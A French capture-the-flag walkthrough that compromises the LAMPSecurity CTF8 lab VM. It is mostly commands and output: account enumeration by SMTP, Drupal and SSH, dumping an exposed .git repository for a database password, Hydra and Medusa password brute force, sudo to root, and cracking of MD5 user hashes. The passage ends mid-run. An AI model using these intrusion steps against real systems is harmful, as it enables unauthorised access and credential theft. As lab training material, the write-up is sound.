# LAMPSecurity: CTF8

Lecture recommandée : [Walkthrough sur le challenge LAMPSecurity: CTF5](/CTF-VulnLabs/lampsecurity-CTF5)

[LAMPSecurity](https://sourceforge.net/projects/lampsecurity/) est un projet conçu par
[le chercheur en sécurité madirish2600](https://www.vulnhub.com/author/madirish2600,75/), qui nous gratifie d'un ensemble de machines virtuelles volontairement vulnérables. L'objectif est de trouver et d'exploiter des vulnérabilités sur chacune de ces VM, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. Ce _walkthrough_ sera consacré à la résolution complète de la huitième et avant-dernière VM de la série, [LAMPSecurity CTF8](https://www.vulnhub.com/entry/lampsecurity-ctf8,87/). Vous voilà prévenus, attention aux spoilers.

## Recherche d'informations

Comme pour les autres challenges LampSecurity, [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM LAMPSecurity CTF8.

```console
root@blinils:~# netdiscover -r 192.168.56.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts

3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.56.1    0a:00:27:00:00:10      1      60  Unknown vendor
192.168.56.100  08:00:27:e2:87:7b      1      60  PCS Systemtechnik GmbH
192.168.56.102  08:00:27:ad:1f:97      1      60  PCS Systemtechnik GmbH
```

192.168.56.101 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), tandis que 192.168.56.102 correspond à l'adresse IP de la VM LAMPSecurity CTF8. L'outil [nmap](https://nmap.org/book/man.html) est lancé en premier afin de détecter les ports ouverts sur le serveur CTF8, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.

```console
root@blinils:~# nmap -sT -sV -p- 192.168.56.102

Nmap scan report for 192.168.56.102
Host is up (0.0011s latency).
Not shown: 65509 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.5
22/tcp   open  ssh         OpenSSH 4.3 (protocol 2.0)
25/tcp   open  smtp        Sendmail
80/tcp   open  http        Apache httpd 2.2.3 ((CentOS))
110/tcp  open  pop3        Dovecot pop3d
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
443/tcp  open  ssl/https?
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
842/tcp  open  status      1 (RPC #100024)
993/tcp  open  ssl/imaps?
995/tcp  open  ssl/pop3s?
3306/tcp open  mysql       MySQL (unauthorized)
5801/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5901)
5802/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5902)
5803/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5903)
5804/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5904)
5901/tcp open  vnc         VNC (protocol 3.8)
5902/tcp open  vnc         VNC (protocol 3.8)
5903/tcp open  vnc         VNC (protocol 3.8)
5904/tcp open  vnc         VNC (protocol 3.8)
6001/tcp open  X11         (access denied)
6002/tcp open  X11         (access denied)
6003/tcp open  X11         (access denied)
6004/tcp open  X11         (access denied)
MAC Address: 08:00:27:AD:1F:97 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix
```

Shoot! Il y a beaucoup de ports ouverts sur cette machine... à première vue, il semble possible de [se connecter à distance avec SSH](https://en.wikipedia.org/wiki/Secure_Shell) au serveur LAMPSecurity CTF8 (port 22), un serveur Web Apache 2.2.3 (ports 80/443), un système de [partage de fichiers Samba](https://en.wikipedia.org/wiki/Samba_(software)) (ports 139 et 445), une base de données MySQL (port 3306) et un serveur de messagerie électronique (ports 110/143/993/995) y sont installés ; d'autre part, plusieurs [connexions VNC](https://en.wikipedia.org/wiki/Virtual_Network_Computing) semblent être initiées sur ce serveur. Pour chacun de ces services, il est désormais temps de partir à la chasse aux vulnérabilités.

![Affichage de l'image CTF8_user_view.png](images/CTF8_user_view.png)

Le serveur Web semble a priori le plus alléchant pour commencer ; le site qu'il va falloir analyser de fond en comble est le blog de l'entreprise fictive LAMPSec Research. _LAMPSec Research is a leading edge commercial research and information analysis firm. We provide expert understanding of emerging trends to aid in the information security defensive capabilities of our clients. Our research labs investigate trending threats to provide measurable countermeasures to help keep our clients safe._

## À la recherche de comptes utilisateurs valides

Plusieurs pages y ont été publiées en mars 2013, par deux utilisateurs : Barbara et Steve. En tout, les contacts de dix-neuf salariés de LAMPSec Research figurent dans les pages _executives_, _marketing_, _research_, _sales_ et _support_. Ces informations peuvent être récupérées manuellement, en parcourant tout le site Web : James Harraway, Steve Pinkton (_Executives_), Sherry Holden, Barbara Dio, Johnathan Alderman (_Marketing_), Dr. Harvey Plink, Jeff Grimes, Stacey Hunter, Juan Ingersol, Michael Swanson, Jerome Stone (_Research_), Gene Connor, Susan Swiney, Dan Hart, George Prune (_Sales_), John Goldman, Tom Maloney, Xavier Bruce et Sally Loreman (_Support_).

Le module _drupal_views_user_enum_ en liste deux de plus : Anonymous et admin.

```console
root@blinils:~# msfconsole --quiet
msf > use auxiliary/scanner/http/drupal_views_user_enum
msf auxiliary(scanner/http/drupal_views_user_enum) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102
msf auxiliary(scanner/http/drupal_views_user_enum) > run

[*] Begin enumerating users at 192.168.56.102
[*] Done. 21 usernames found...
[+] Found User: Anonymous
[+] Found User: admin
[+] Found User: Barbara
[+] Found User: Dan
[+] Found User: Gene
[+] Found User: George
[+] Found User: Harvey
[+] Found User: Jeff
[+] Found User: Jerome
[+] Found User: Jim
[+] Found User: John
[+] Found User: Johnathan
[+] Found User: Juan
[+] Found User: Michael
[+] Found User: Sally
[+] Found User: Sherry
[+] Found User: Stacey
[+] Found User: Steve
[+] Found User: Susan
[+] Found User: Tom
[+] Found User: Xavier
```

### SMTP User Enumeration (VRFY et EXPN)

Et la cerise sur le gâteau : en fouillant un peu le site Web, il est possible de récupérer les adresses e-mail sur chacune des pages utilisateur, et d'obtenir ainsi des logins potentiels : jharraway, spinkton, sholden, bdio, jalderman, hplink, jgrimes, shunter, jingersol, mswanson, jstone, gconnor, sswiney, dhart, gprune, jgoldman, tmaloney, xbruce, sloreman. Hop, c'est sauvegardé dans un fichier texte pour une utilisation future.

```console
root@blinils:~# cat drupal_firstnames.txt
admin
anonymous
Barbara
Jim
Steve
Sherry
Gene
Harvey
John
Johnathan
Susan
Dan
George
Jeff
Stacey
Juan
Michael
Jerome
Tom
Xavier
Sally

root@blinils:~# cat drupal_users.txt
admin
anonymous
sloreman
tmaloney
xbruce
mswanson
jstone
shunter
jingersol
jgrimes
dhart
gprune
jalderman
jgoldman
bdio
hplink
gconnor
sholden
spinkton
jharraway
sswiney
```

Il est possible de vérifier à l'aide du protocole SMTP si ces logins sont valides, et s'il s'agit de comptes Unix valides. En effet, [le protocole SMTP](https://tools.ietf.org/html/rfc821#page-9) embarque les commandes VRFY (Verify) et EXPN (Expand) qui, pour un compte utilisateur donné, vont respectivement vérifier si ce compte existe et s'il existe une liste de diffusion associée à ce compte utilisateur.

```console
root@blinils:~# telnet 192.168.56.102 25
Trying 192.168.56.102...
Connected to 192.168.56.102.
Escape character is '^]'.
220 localhost.localdomain ESMTP Sendmail
EXPN bdio
250 2.1.5 <bdio@localhost.localdomain>
VRFY bdio
250 2.1.5 <bdio@localhost.localdomain>
VRFY ctf8
550 5.1.1 ctf8... User unknown
quit
221 2.0.0 localhost.localdomain closing connection
Connection closed by foreign host.
```

À l'aide du module Metasploit _[smtp_enum](https://www.offensive-security.com/metasploit-unleashed/scanner-smtp-auxiliary-modules/)_, il est possible de tester très rapidement si les comptes récupérés précédemment sont valides ou non.

```console
msf > use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(scanner/smtp/smtp_enum) > set USER_FILE drupal_users.txt
USER_FILE => drupal_users.txt
msf auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102
msf auxiliary(scanner/smtp/smtp_enum) > run

[*] 192.168.56.102:25     - 192.168.56.102:25 Banner: 220 localhost.localdomain ESMTP Sendmail
[+] 192.168.56.102:25     - 192.168.56.102:25 Users found: bdio, dhart, gconnor, gprune, hplink,
jalderman, jgoldman, jgrimes, jharraway, jingersol, jstone, mswanson, sholden, shunter, sloreman,
spinkton, sswiney, tmaloney, xbruce
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ça marche aussi sans Metasploit, grâce au script [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) écrit en Perl, et même si le rendu n'est pas tip top.

```console
root@blinils:~# perl smtp-user-enum.pl -M VRFY -U drupal_users.txt -t 192.168.56.102

--snip--
######## Scan started at Sat Dec  1 11:11:11 2018 #########
exists.56.102: tmaloney
exists.56.102: sloreman
exists.56.102: xbruce
exists.56.102: mswanson
exists.56.102: jstone
exists.56.102: shunter
exists.56.102: jingersol
exists.56.102: jgrimes
exists.56.102: dhart
exists.56.102: gprune
exists.56.102: jalderman
exists.56.102: bdio
exists.56.102: jgoldman
exists.56.102: hplink
exists.56.102: gconnor
exists.56.102: spinkton
exists.56.102: sholden
exists.56.102: jharraway
192.168.56.102: sswiney exists

######## Scan completed at Sat Dec  1 11:11:11 2018 #########
19 results.

21 queries in 1 seconds (21.0 queries / sec)
```

### SSH Username Enumeration (CVE-2018-15473)

Une vulnérabilité liée à OpenSSH a été rendue publique en août 2018, puis classée sous l'identifiant [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/CVE-2018-15473). En résumé, lors d'une connexion SSH (demande d'authentification du client auprès du serveur), le serveur vulnérable répondra différemment selon si le compte utilisateur fourni existe ou non. De cette manière, tout comme le protocole SMTP, il est possible de déterminer très rapidement si un compte utilisateur existe ou non. La vulnérabilité est bien plus expliquée en détails sur sekurak.pl _[OpenSSH – users enumeration – CVE-2018-15473](https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/)_ ou encore sur le blog de Didier Stevens _[OpenSSH User Enumeration Vulnerability: a Close Look](https://blog.nviso.be/2018/08/21/openssh-user-enumeration-vulnerability-a-close-look/)_.

Le script utilisé pour ce CTF est celui de [Justin Gardner](https://twitter.com/rhynorater), publié sur [Exploit-DB](https://www.exploit-db.com/exploits/45233) sous la référence 45233. Seul petit problème rencontré : une erreur ```TypeError: 'property' object has no attribute '__getitem__'``` liée semble-t-il à la librairie [paramiko](http://www.paramiko.org/), mais dont la solution a été [publiée sur Github](https://github.com/paramiko/paramiko/issues/1314).

```console
root@blinils:~# python sshUsernameEnumExploit.py --userList drupal_users.txt 192.168.56.102 --outputFile test.txt
Traceback (most recent call last):
  File "sshUsernameEnumExploit.py", line 30, in <module>
    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
TypeError: 'property' object has no attribute '__getitem__'

root@blinils:~# sed -i 's/._handler_table/._client_handler_table/g' sshUsernameEnumExploit.py

root@blinils:~# python sshUsernameEnumExploit.py --userList drupal_users.txt 192.168.56.102 --outputFile test.txt
[+] Results successfully written to test.txt in List form.

root@blinils:~# cat test.txt
admin is not a valid user!
anonymous is not a valid user!
sloreman is a valid user!
tmaloney is a valid user!
xbruce is a valid user!
mswanson is a valid user!
jstone is a valid user!
shunter is a valid user!
jingersol is a valid user!
jgrimes is a valid user!
dhart is a valid user!
gprune is a valid user!
jalderman is a valid user!
jgoldman is a valid user!
bdio is a valid user!
hplink is a valid user!
gconnor is a valid user!
sholden is a valid user!
spinkton is a valid user!
jharraway is a valid user!
sswiney is a valid user!
```

Le module _ssh_enumusers_ confirme les résultats obtenus précédemment.

```console
root@blinils:~# msfconsole --quiet
[*] Starting persistent handler(s)...

msf > use auxiliary/scanner/ssh/ssh_enumusers
msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE drupal_users.txt
USER_FILE => drupal_users.txt
msf auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 192.168.56.102:22 - SSH - Using malformed packet technique
[*] 192.168.56.102:22 - SSH - Starting scan
[-] 192.168.56.102:22 - SSH - User 'admin' not found
[-] 192.168.56.102:22 - SSH - User 'anonymous' not found
[+] 192.168.56.102:22 - SSH - User 'sloreman' found
[+] 192.168.56.102:22 - SSH - User 'tmaloney' found
[+] 192.168.56.102:22 - SSH - User 'xbruce' found
[+] 192.168.56.102:22 - SSH - User 'mswanson' found
[+] 192.168.56.102:22 - SSH - User 'jstone' found
[+] 192.168.56.102:22 - SSH - User 'shunter' found
[+] 192.168.56.102:22 - SSH - User 'jingersol' found
[+] 192.168.56.102:22 - SSH - User 'jgrimes' found
[+] 192.168.56.102:22 - SSH - User 'dhart' found
[+] 192.168.56.102:22 - SSH - User 'gprune' found
[+] 192.168.56.102:22 - SSH - User 'jalderman' found
[+] 192.168.56.102:22 - SSH - User 'jgoldman' found
[+] 192.168.56.102:22 - SSH - User 'bdio' found
[+] 192.168.56.102:22 - SSH - User 'hplink' found
[+] 192.168.56.102:22 - SSH - User 'gconnor' found
[+] 192.168.56.102:22 - SSH - User 'sholden' found
[+] 192.168.56.102:22 - SSH - User 'spinkton' found
[+] 192.168.56.102:22 - SSH - User 'jharraway' found
[+] 192.168.56.102:22 - SSH - User 'sswiney' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Dump du dépôt Git et extraction d'informations sensibles

Poursuivons l'analyse du serveur Web : y a-t-il des répertoires « cachés » présents sur le site ? Pour le savoir, l'outil [DIRB](https://tools.kali.org/web-applications/dirb) va se servir d'une liste pré-établie de répertoires afin de déterminer l'arborescence du site. Il s'agit là d'une [attaque par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking), a contrario d'une [attaque par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consisterait à tester, de manière exhaustive, toutes les combinaisons possibles : aa, ab, ac... zy zz aaa aab... zzy zzz aaaa aaab... et ainsi de suite. DIRB dispose d'un [large panel de dictionnaires](https://github.com/digination/dirbuster-ng/tree/master/wordlists), ainsi plusieurs résultats sont renvoyés avec le dictionnaire common.txt.

```console
root@blinils:~# dirb http://192.168.56.102

--snip--                      

---- Scanning URL: http://192.168.56.102/ ----
+ http://192.168.56.102/.git/HEAD (CODE:200|SIZE:23)
+ http://192.168.56.102/.profile (CODE:403|SIZE:289)
+ http://192.168.56.102/0 (CODE:200|SIZE:7957)
+ http://192.168.56.102/admin (CODE:403|SIZE:5493)
+ http://192.168.56.102/Admin (CODE:403|SIZE:5493)
+ http://192.168.56.102/ADMIN (CODE:403|SIZE:5493)
+ http://192.168.56.102/all-wcprops (CODE:403|SIZE:292)
+ http://192.168.56.102/batch (CODE:403|SIZE:5493)
+ http://192.168.56.102/cgi-bin/ (CODE:403|SIZE:289)
+ http://192.168.56.102/contact (CODE:200|SIZE:7340)
+ http://192.168.56.102/Contact (CODE:200|SIZE:7340)
+ http://192.168.56.102/entries (CODE:403|SIZE:288)
+ http://192.168.56.102/format (CODE:403|SIZE:287)
==> DIRECTORY: http://192.168.56.102/includes/
+ http://192.168.56.102/index.php (CODE:200|SIZE:7965)
+ http://192.168.56.102/install.mysql (CODE:403|SIZE:294)
+ http://192.168.56.102/install.pgsql (CODE:403|SIZE:294)
+ http://192.168.56.102/logout (CODE:403|SIZE:5496)
==> DIRECTORY: http://192.168.56.102/manual/
+ http://192.168.56.102/marketing (CODE:200|SIZE:6833)
==> DIRECTORY: http://192.168.56.102/misc/
==> DIRECTORY: http://192.168.56.102/modules/
+ http://192.168.56.102/node (CODE:200|SIZE:7960)
+ http://192.168.56.102/phpinfo.php (CODE:200|SIZE:47684)
+ http://192.168.56.102/profile (CODE:200|SIZE:8679)
==> DIRECTORY: http://192.168.56.102/profiles/
+ http://192.168.56.102/research (CODE:200|SIZE:7263)
+ http://192.168.56.102/Research (CODE:200|SIZE:7263)
+ http://192.168.56.102/robots.txt (CODE:200|SIZE:1629)
+ http://192.168.56.102/Root (CODE:403|SIZE:285)
+ http://192.168.56.102/sales (CODE:200|SIZE:6807)
==> DIRECTORY: http://192.168.56.102/scripts/
+ http://192.168.56.102/search (CODE:200|SIZE:8940)
+ http://192.168.56.102/Search (CODE:200|SIZE:8940)
==> DIRECTORY: http://192.168.56.102/sites/
+ http://192.168.56.102/support (CODE:200|SIZE:6694)
+ http://192.168.56.102/Support (CODE:200|SIZE:6694)
==> DIRECTORY: http://192.168.56.102/themes/
+ http://192.168.56.102/tracker (CODE:200|SIZE:11213)
+ http://192.168.56.102/usage (CODE:403|SIZE:286)
+ http://192.168.56.102/user (CODE:200|SIZE:5453)
==> DIRECTORY: http://192.168.56.102/webmail/
+ http://192.168.56.102/xmlrpc.php (CODE:200|SIZE:42)
```

Beaucoup de résultats sont renvoyés, mais l'analyse est rapide ; la première ligne renvoyée par DIRB est d'ores et déjà intéressante. En effet, il semblerait que [le dépôt Git](https://en.wikipedia.org/wiki/Git) du CTF8 soit accessible sans aucune authentification, ce qui pourrait permettre à une personne malveillante de récupérer tout le code source du site Web. Ainsi, [le script gitdumper.sh](https://github.com/internetwache/GitTools) développé par [Sebastian Neef](https://neef.it/) va être mis en oeuvre pour ce CTF8. Lecture recommandée : _[Don't publicly expose .git or how we downloaded your website's sourcecode - An analysis of Alexa's 1M](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/)_ sur le blog d'Internetwache.

```console
root@blinils:~# ./gitdumper.sh http://192.168.56.102/.git/ git-dump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########

[*] Destination folder does not exist
[+] Creating /root/git-dump/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/6c/4cfa185870956f7a782ac7ea4046f80691067e
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/c2/377e9afe253329d0119282f1f47799574db651
[+] Downloaded: objects/7f/ddf15ba2e08ccb3bf66273f2631e397c2b938d
[+] Downloaded: objects/8a/ab41cdc56359963e5b202f723b1de4c647612b
[+] Downloaded: objects/14/3decbc568bcde1accf6a9064467159d52b8697
--snip--
[+] Downloaded: objects/f3/2702980580cdf730fdca069850bd0453ae89fa
[+] Downloaded: objects/c4/210e918116bf88bae9533df3d90d7c5a943c3c
[+] Downloaded: objects/a4/ec2a2b63431a3625c351753417af8ca30d8093
[+] Downloaded: objects/99/5df52065bc250180081f895070ee63de05bfe7
[+] Downloaded: objects/c0/4d21b76ecfec013db907302f6bd35afff6cef9
```

L'historique des validations (_commit history_) est on ne peut plus clair : un mot de passe MySQL est présent quelque part.

```console
root@blinils:~/git-dump/.git/logs# cat HEAD
0000000000000000000000000000000000000000 c2377e9afe253329d0119282f1f47799574db651
root <root@localhost.localdomain> 1370011280 -0400	commit (initial): Changed the password for connection to MySQL.
c2377e9afe253329d0119282f1f47799574db651 7fddf15ba2e08ccb3bf66273f2631e397c2b938d
John Goldman (Ninja) <jgoldman@localhost.localdomain> 1370011345 -0400	commit (amend): Changed the password for connection to MySQL.
7fddf15ba2e08ccb3bf66273f2631e397c2b938d 6c4cfa185870956f7a782ac7ea4046f80691067e
John Goldman (Ninja) <jgoldman@localhost.localdomain> 1370013236 -0400	commit: initial commit
```

Après une recherche éclair, on finit par retrouver sa trace dans le fichier _settings.php_ du site.

```console
root@blinils:~/git-dump/sites/default# cat settings.php | grep db_url
 * Note that the $db_url variable gets parsed using PHP's built-in
 * $db_url parts, you can escape them via URI hex encodings:
 * of $db_url variables with the 'default' element used until otherwise
 *   $db_url = 'mysql://username:password@localhost/databasename';
 *   $db_url = 'mysqli://username:password@localhost/databasename';
 *   $db_url = 'pgsql://username:password@localhost/databasename';
$db_url = 'mysqli://root:JumpUpAndDown@localhost/drupal';
```

Malheureusement, ce mot de passe ne correspond à aucun compte Drupal ou login SSH, il va falloir creuser davantage.

## À la recherche d'un mot de passe valide

L'IHM d'administration est la première piste envisagée, et le compte _admin_ est bien évidemment le premier à être testé.

```console
root@blinils:~# hydra -l admin -P rockyou.txt 192.168.56.102 http-form-post \
'/node?destination=node:name=^USER^&pass=^PASS^&op=Log+in&form_build_id=form-e07a3b33babb2f3209fd8516fc0415f2&form_id=user_login_block:S=Location' -t 32
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-11 10:09:08
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344398 login tries (l:1/p:14344398), ~448263 tries per task
[DATA] attacking http-post-form://192.168.56.102:80//node?destination=node:name=
^USER^&pass=^PASS^&op=Log+in&form_build_id=form-e07a3b33babb2f3209fd8516fc0415f2&form_id=user_login_block:S=Location
[STATUS] 396.00 tries/min, 396 tries in 00:01h, 14344002 to do in 603:43h, 32 active
[STATUS] 370.53 tries/min, 5558 tries in 00:15h, 14338840 to do in 644:58h, 32 active
[80][http-post-form] host: 192.168.56.102   login: admin   password: football123
1 of 1 target successfully completed, 1 valid password found
```

Et hop, nous voici en possession du mot de passe _football123_. Avant de nous lancer dans la mise en place d'un _[reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)_ afin d'interagir avec le serveur, il est tout de même pertinent de vérifier si ce mot de passe n'est pas réutilisé ailleurs... pour des accès SSH au serveur, par exemple, ou pour d'autres accès à l'interface d'administration de Drupal ?

```console
root@blinils:~# hydra -L drupal_firstnames.txt -p football123 192.168.56.102 http-form-post \
'/node?destination=node:name=^USER^&pass=^PASS^&op=Log+in&form_build_id=form-e07a3b33babb2f3209fd8516fc0415f2&form_id=user_login_block:S=Location' -t 32
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-11 11:10:09
[DATA] max 21 tasks per 1 server, overall 21 tasks, 21 login tries (l:21/p:1), ~1 try per task
[DATA] attacking http-post-form://192.168.56.102:80//node?destination=node:name=
^USER^&pass=^PASS^&op=Log+in&form_build_id=form-e07a3b33babb2f3209fd8516fc0415f2&form_id=user_login_block:S=Location
[80][http-post-form] host: 192.168.56.102   login: admin   password: football123
1 of 1 target successfully completed, 1 valid password found
```

Seul le compte admin a pour mot de passe _football123_. Quid des comptes SSH ?

```console
root@blinils:~# medusa -h 192.168.56.102 -U drupal_users.txt -p football123 -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 21, 0 complete) Password: football123 (1 of 1 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: anonymous (2 of 21, 1 complete) Password: football123 (1 of 1 complete)
--snip--
ACCOUNT FOUND: [ssh] Host: 192.168.56.102 User: spinkton Password: football123 [SUCCESS]
ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: jharraway (20 of 21, 19 complete) Password: football123 (1 of 1 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: sswiney (21 of 21, 20 complete) Password: football123 (1 of 1 complete)
```

Bingo ! Il est possible de se connecter en SSH au serveur LampSecurity CTF8 avec les _credentials_ spinkton/football123.

```console
root@blinils:~# ssh spinkton@192.168.56.102
The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
RSA key fingerprint is SHA256:xSrcP5XsyEzr8DCoPYgg+REQ93Uy3BY9DQekfL0l3+E.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.102' (RSA) to the list of known hosts.
Welcome to LAMPSecurity Research SSH access!
#flag#5e937c51b852e1ee90d42ddb5ccb8997

Unauthorized access is expected...
spinkton@192.168.56.102's password: 
Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
#flag#motd-flag

[spinkton@localhost ~]$ id
uid=501(spinkton) gid=505(spinkton) groups=10(wheel),500(it),505(spinkton) --snip--
```

Dommage, comme la plupart des autres VM, l'élévation de privilèges est un jeu d'enfant ; en effet, le compte spinkton [dispose de privilèges](https://doc.ubuntu-fr.org/sudoers) plutôt... permissifs et est autorisé à exécuter toutes les commandes via sudo. Il est alors possible de passer root avec la commandes ```sudo su``` ou ```sudo /bin/bash``` et le tour est joué. Cependant, le walkthrough est loin d'être terminé !

```console
[spinkton@localhost ~]$ sudo -l
Password: 
User spinkton may run the following commands on this host:
    (ALL) ALL
[spinkton@localhost ~]$ sudo /bin/bash

[root@localhost ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) --snip--
```

## MySQL

En effet, il y a encore la base de données MySQL à explorer et ce, à l'aide du mot de passe _JumpUpAndDown_ trouvé dans le répertoire .git.

```console
[spinkton@localhost ~]$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 52310
Server version: 5.0.45 Source distribution

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| drupal             | 
| flag               | 
| mysql              | 
| test               | 
+--------------------+
5 rows in set (0.01 sec)

mysql> use drupal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

mysql> select name, pass from users;
+-----------+----------------------------------+
| name      | pass                             |
+-----------+----------------------------------+
|           |                                  | 
| admin     | 49265c16d1dff8acef3499bd889299d6 | 
| Barbara   | bed128365216c019988915ed3add75fb | 
| Jim       | 2a5de0f53b1317f7e36afcdb6b5202a4 | 
| Steve     | 08d15a4aef553492d8971cdd5198f314 | 
| Sherry    | c3319d1016a802db86653bcfab871f4f | 
| Gene      | 9b9e4bbd988954028a44710a50982576 | 
| Harvey    | 7d29975b78825ea7c27f5c0281ea2fa4 | 
| John      | 518462cd3292a67c755521c1fb50c909 | 
| Johnathan | 6dc523ebd2379d96cc0af32e2d224db0 | 
| Susan     | 0d42223010b69cab86634bc359ed870b | 
| Dan       | 8f75ad3f04fc42f07c95e2f3d0ec3503 | 
| George    | ed2b1f468c5f915f3f1cf75d7068baae | 
| Jeff      | ca594f739e257245f2be69eb546c1c04 | 
| Stacey    | 85aca385eb555fb6a36a62915ddd8bc7 | 
| Juan      | 573152cc51de19df50e90b0e557db7fe | 
| Michael   | c7a4476fc64b75ead800da9ea2b7d072 | 
| Jerome    | 42248d4cb640a3fb5836571e254aee2b | 
| Tom       | 971dcf53e88e9268714d9d504753d347 | 
| Xavier    | 3005d829eb819341357bfddf541c175b | 
| Sally     | 7a1c07ff60f9c07ffe8da34ecbf4edc2 | 
+-----------+----------------------------------+
21 rows in set (0.00 sec)
```

Des [hashs MD5](https://en.wikipedia.org/wiki/MD5) ! Seulement dix mots de passe sont trouvés via une attaque par dictionnaire avec [rockyou.txt](https://wiki.skullsecurity.org/Passwords) !

```console
root@blinils:~# john drupal_users.pass --format=Raw-MD5 --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 20 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
cherry           (Michael)
fantasy          (Sally)
12341234         (George)
passw0rd         (Barbara)
football123      (admin)
swanson          (Juan)
letmein!         (Jim)
thundercats      (Xavier)
BobMarley        (Susan)
1website         (Sherry)
10g 0:00:00:05 DONE (2018-12-12 12:12) 1.814g/s 2603Kp/s 2603Kc/s 26511KC/s       7..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Des sites en ligne tels que [HashKiller](https://hashkiller.co.uk/md5-decrypter.aspx) ou [CrackStation](https://crackstation.net/) viennent compléter la liste des mots de passe Drupal récupérés.

16/20 pour CrackStation !

![Affichage de l'image CTF8_passdrupal_CrackStation.png](images/CTF8_passdrupal_CrackStation.png)

20/20 pour HashKiller !

![Affichage de l'image CTF8_passdrupal_HashKiller.png](images/CTF8_passdrupal_HashKiller.png)

On récupère le tout et on vérifie que les mots de passe trouvés sont effectivement les bons.

```console
root@blinils:~# cat passwordsflags.txt
football123
passw0rd
letmein!
drupal
1website
superSun123
MonsterDrink
4summer13
1loveU
BobMarley
BaseballSeason
12341234
sitepass
Seventy70
swanson
cherry
buddahbrother
drupalpassword
thundercats
fantasy

root@blinils:~# hydra -L drupal_firstnames.txt -P passwordsflags.txt 192.168.56.102 http-form-post \
'/node?destination=node:name=^USER^&pass=^PASS^&op=Log+in&form_build_id=form-e07a3b33babb2f3209fd8516fc0415f2&form_id=user_login_block:S=Location' -t 8
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-10 08:06:04
